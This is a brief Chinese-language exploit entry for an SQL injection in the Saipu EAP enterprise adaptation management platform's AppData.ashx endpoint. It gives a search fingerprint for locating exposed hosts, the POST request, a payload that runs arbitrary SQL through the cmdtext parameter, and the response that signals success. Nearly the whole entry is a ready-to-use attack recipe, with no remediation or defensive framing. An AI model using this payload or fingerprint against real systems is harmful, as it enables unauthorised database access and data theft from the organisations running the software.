# 赛普EAP企业适配管理平台AppData.ashx存在SQL注入漏洞

赛普EAP企业适配管理平台 ｜ SQL注入 ｜ —
- **指纹**：`body="IDWebSoft/"`
- **请求**：`POST /IDWebSoft/AppData.ashx HTTP/1.1`

**Payload**
```
action=GetDataTableByText&cmdtext=select @@version;
```
- **响应特征**：200